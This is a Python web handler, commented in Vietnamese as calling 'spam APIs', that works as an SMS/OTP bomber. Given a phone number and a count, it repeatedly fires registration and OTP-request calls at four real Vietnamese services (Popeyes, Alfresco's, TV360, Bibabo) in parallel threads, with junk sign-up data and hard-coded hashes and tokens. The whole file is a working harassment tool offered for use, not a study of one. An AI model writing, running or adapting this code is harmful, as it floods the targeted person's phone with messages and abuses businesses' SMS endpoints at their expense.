from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
import requests
from concurrent.futures import ThreadPoolExecutor
import time

threading = ThreadPoolExecutor(max_workers=10)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        phone = params.get('phone', [''])[0]
        amount = int(params.get('amount', ['1'])[0])
        
        if amount > 10:
            amount = 10
        
        if not phone:
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Thiếu SĐT"}).encode())
            return
        
        # Gọi các API spam chính (rút gọn để phù hợp 10s)
        for i in range(amount):
            threading.submit(popeyes, phone)
            threading.submit(alfrescos, phone)
            threading.submit(tv360, phone)
            threading.submit(bibabo, phone)
            time.sleep(0.3)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            "status": "success",
            "phone": phone,
            "amount": amount
        }, ensure_ascii=False).encode())

# ====== CÁC HÀM API (giữ nguyên từ code gốc của bạn) ======
def popeyes(sdt):
    headers = {
        'Host': 'api.popeyes.vn',
        'accept': 'application/json',
        'x-client': 'WebApp',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json',
        'origin': 'https://popeyes.vn',
        'referer': 'https://popeyes.vn/',
    }
    data = '{"phone":"' + sdt + '","firstName":"Cac","lastName":"Lo","email":"kong@gmail.com","password":"12345gdtg"}'
    try:
        requests.post('https://api.popeyes.vn/api/v1/register', headers=headers, data=data, timeout=3)
    except:
        pass

def alfrescos(sdt):
    headers = {
        'Host': 'api.alfrescos.com.vn',
        'accept': 'application/json',
        'brandcode': 'ALFRESCOS',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json',
    }
    data = '{"phoneNumber":"' + sdt + '","secureHash":"66148faf3cab6e527b8b044745e27dbd","deviceId":"","sendTime":1693660146481,"type":1}'
    try:
        requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', headers=headers, data=data, timeout=3)
    except:
        pass

def tv360(phone):
    try:
        requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", 
            headers={"Content-Type": "application/json"},
            json={"msisdn":"0"+phone[1:11]}, timeout=3)
    except:
        pass

def bibabo(sdt):
    headers = {
        "Host": "bibabo.vn",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "Origin": "https://bibabo.vn",
        "Referer": "https://bibabo.vn/user/signupPhone",
    }
    data = {"phone": sdt, "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"}
    try:
        requests.post("https://bibabo.vn/user/verify-phone", headers=headers, data=data, timeout=3)
    except:
        pass
